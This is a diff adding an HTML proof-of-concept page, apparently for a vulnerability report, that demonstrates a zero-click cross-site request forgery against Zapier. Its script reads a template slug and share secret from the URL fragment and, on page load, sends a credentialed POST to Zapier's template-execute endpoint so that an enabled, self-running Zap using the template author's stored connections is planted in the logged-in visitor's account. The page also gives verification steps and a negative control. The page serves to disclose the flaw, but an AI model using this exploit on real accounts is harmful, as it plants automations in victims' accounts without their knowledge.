@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Zapier guided-template cross-site plant — PoC</title>
+<style>
+body{font:15px/1.55 system-ui,sans-serif;max-width:820px;margin:0 auto;padding:28px 20px 80px;background:#f6f7f9;color:#1c1e21}
+.b{background:#fff;border:1px solid #d9dce1;border-radius:10px;padding:16px 18px;margin:14px 0}
+pre{background:#14161a;color:#d6e2f0;padding:12px;border-radius:8px;overflow-x:auto;font-size:12.5px}
+input{width:100%;max-width:620px;box-sizing:border-box;padding:7px 10px;border:1px solid #b9bec6;border-radius:6px;font:13px ui-monospace,Menlo,monospace}
+button{margin:12px 8px 0 0;padding:8px 14px;border-radius:6px;border:1px solid #b9bec6;background:#fff;font-weight:600;cursor:pointer}
+.bp{background:#b3261e;border-color:#b3261e;color:#fff}
+.e{border-left:3px solid #1e7e34;padding:6px 10px;background:#fff;font:12.5px ui-monospace,Menlo,monospace}
+</style>
+</head>
+<body>
+<h1>Zapier: cross-site planting of an enabled, self-running Zap via a guided template — CRITICAL</h1>
+<p>A template author's stored <code>zsl.zaps[0].enabled</code> and each step's <code>authentication_id</code> are applied to the Zap created in the <b>consumer's</b> account. The consumer reviews nothing, enables nothing, and the planted Zap runs itself.</p>
+<div class="b">
+<b>Requirements</b>
+<ul>
+<li><b>A different account from the template author must be logged in to <code>zapier.com</code></b> in this browser — that account receives the Zap.</li>
+<li><b>Chrome</b>, or any browser attaching <code>zapier.com</code> cookies cross-site. Credentialed cross-site "simple" request — no preflight, no CSRF token.</li>
+<li><b>Open DevTools ▸ Network first.</b> The response is cross-origin-unreadable — expected, and irrelevant: nothing here needs to read it.</li>
+<li><b>Zero-click:</b> fires on load when the values are present.</li>
+</ul>
+</div>
+<div class="b">
+<label>Template slug</label><input id="slug" placeholder="template slug">
+<label>Share secret (url_secret subjectId)</label><input id="secret" placeholder="share subjectId">
+<div><button class="bp" onclick="plant()">Fire cross-site plant</button><button onclick="plant({credentials:'omit'})">Negative control (no cookies)</button></div>
+<div id="log"></div>
+</div>
+<div class="b"><b>Verify in the victim account</b>
+<pre>GET /api/gulliver/storage/v1/zaps/&lt;new zap id&gt;?account_id=&lt;victim&gt;
+→ { "is_enabled": true,
+    "current_version": { "version_number": 1, "subscription": true } }</pre>
+<p>The <code>enabled:false</code> counterpart produces <code>"is_enabled": false</code>, <code>"current_version": null</code>. That pairing is the control.</p>
+</div>
+<script>
+(async()=>{
+const log=m=>{const d=document.createElement("div");d.className="e";d.textContent=m;document.getElementById("log").appendChild(d)};
+// Values arrive in the URL fragment. A fragment is never sent to the origin,
+// so this host — and its access logs — never see them.
+const p=new URLSearchParams(location.hash.replace(/^#/,""));
+if(p.get("slug"))document.getElementById("slug").value=p.get("slug");
+if(p.get("secret"))document.getElementById("secret").value=p.get("secret");
+window.plant=async o=>{
+ const s=document.getElementById("slug").value.trim(),k=document.getElementById("secret").value.trim();
+ const body=JSON.stringify({templateSlug:s,referringSource:"template-details",url:"https://zapier.com/templates/details/"+s,secret:k});
+ try{const r=await fetch("https://zapier.com/api/templates/execute",{method:"POST",credentials:(o&&o.credentials)||"include",headers:{"content-type":"text/plain;charset=UTF-8"},body});
+  log("request left the browser — status "+r.status+" (body unreadable cross-origin, expected)")}
+ catch(e){log("response unreadable cross-origin (expected): "+e.message+" — confirm the POST in DevTools ▸ Network")}};
+if(document.getElementById("slug").value&&document.getElementById("secret").value)await window.plant();
+})();
+</script>
+</body>
+</html>
